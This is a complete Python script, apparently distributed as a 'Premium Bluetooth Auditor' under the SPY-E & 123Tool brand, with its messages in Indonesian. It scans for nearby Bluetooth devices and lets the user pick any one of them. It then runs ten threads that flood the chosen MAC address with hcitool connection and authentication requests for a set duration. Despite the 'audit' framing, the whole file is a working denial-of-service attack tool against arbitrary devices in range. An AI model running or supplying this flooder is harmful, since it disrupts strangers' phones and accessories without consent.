```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==========================================
# TOOL NAME : SPY-BLUE-SPAM
# BRAND     : SPY-E & 123Tool Official
# VERSION   : 1.0 (Premium)
# ==========================================

import os
import time
import subprocess
import threading
import sys

# --- UI COLORS ---
C = '\033[96m' # Cyan
G = '\033[92m' # Green
Y = '\033[93m' # Yellow
R = '\033[91m' # Red
W = '\033[0m'  # White
B = '\033[1m'  # Bold

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""
{R}{B}  ██████  ██▓███  ▓██   ██▓    ▄▄▄▄    ██▓     █    ██ ▓█████ 
 ▒██    ▒ ▓██░  ██▒▒██  ██▒   ▓█████▄ ▓██▒    ▓█░  █ ░█░▓█   ▀ 
 ░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░   ▒██▒ ▄██▒██░    ▒█░  █ ░█ ▒███   
   ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░   ▒██░█▀  ▒██░    ░█░ █ ░█ ▒▓█  ▄ 
 ▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░   ░▓█  ▀█▓░██████▒░█░ █ ░█ ░▒████▒
 ▒ ▒▓▒ ▒ ░▒▓▒ ░ ░░  ██▒▒▒     ░▒▓███▀▒░ ▒░▓  ░░ █ ░█ ░█ ░░ ▒░ ░
 ░ ░▒  ░ ░░▒ ░      ▓██ ░▒░     ▒░▒   ░ ░ ▒  ░ ▒█ █ █ █   ░ ░  ░
 ░  ░  ░  ░░        ▒ ▓ ░░       ░    ░   ░ ░  ░█  █  █     ░   
       ░            ░ ░          ░          ░  ░ ░ ░ ░     ░  ░
{W}{C}        >>> SPY-BLUE-STORM | NAGA-BIRU V1.0 <<<
{G}        [ Premium Bluetooth Auditor - SPY-E & 123Tool ]
    """)

def check_root():
    if os.name == 'posix' and os.getuid() != 0:
        print(f"{R}[!] ERROR: Jalankan sebagai ROOT (sudo)!{W}")
        sys.exit()

def scan_devices():
    print(f"{Y}[*] Memindai perangkat Bluetooth di sekitar (8 detik)...{W}")
    try:
        # Menjalankan hcitool scan
        scan_proc = subprocess.check_output(["hcitool", "scan", "--length", "8"]).decode()
        lines = scan_proc.split('\n')[1:]
        devices = []
        for line in lines:
            if line.strip():
                parts = line.split('\t')
                if len(parts) >= 3:
                    devices.append({"mac": parts[1], "name": parts[2]})
        return devices
    except Exception as e:
        print(f"{R}[!] Bluetooth Adapter tidak terdeteksi atau mati.{W}")
        return []

def attack_worker(target_mac, timeout):
    while time.time() < timeout:
        # Melakukan flooding koneksi & autentikasi
        subprocess.Popen(["hcitool", "cc", "--role=m", target_mac], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(["hcitool", "auth", target_mac], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.01)

def main():
    banner()
    check_root()
    
    devices = scan_devices()
    if not devices:
        print(f"{R}[!] Tidak ada perangkat ditemukan atau Bluetooth error.{W}")
        return

    print(f"{B}Daftar Target Ditemukan:{W}")
    for i, dev in enumerate(devices):
        print(f"{C}{i+1}){W} {dev['mac']} | {B}{dev['name']}{W}")

    try:
        choice = input(f"\n{Y}Pilih Target (1-{len(devices)}) atau 'c' (batal): {W}")
        if choice.lower() == 'c': return
        
        idx = int(choice) - 1
        target_mac = devices[idx]['mac']
        duration = int(input(f"{Y}Durasi Audit (detik): {W}"))
        
        timeout = time.time() + duration
        print(f"\n{R}[!] MEMULAI STORM ATTACK KE {target_mac}...{W}")
        
        # Menggunakan threading agar lebih ganas (seperti lxterminal di kode asli)
        threads = []
        for _ in range(10): # 10 Jalur serangan simultan
            t = threading.Thread(target=attack_worker, args=(target_mac, timeout))
            t.start()
            threads.append(t)
            
        while time.time() < timeout:
            print(f"{Y}>>> STATUS: SENDING FLOOD PACKETS... [{int(timeout - time.time())}s]{W}", end="\r")
            time.sleep(1)
            
        for t in threads:
            t.join()
            
        print(f"\n{G}[OK] Audit Selesai. Target telah diuji ketahanannya.{W}")
        
    except (ValueError, IndexError):
        print(f"{R}[!] Input tidak valid!{W}")

if __name__ == "__main__":
    main()
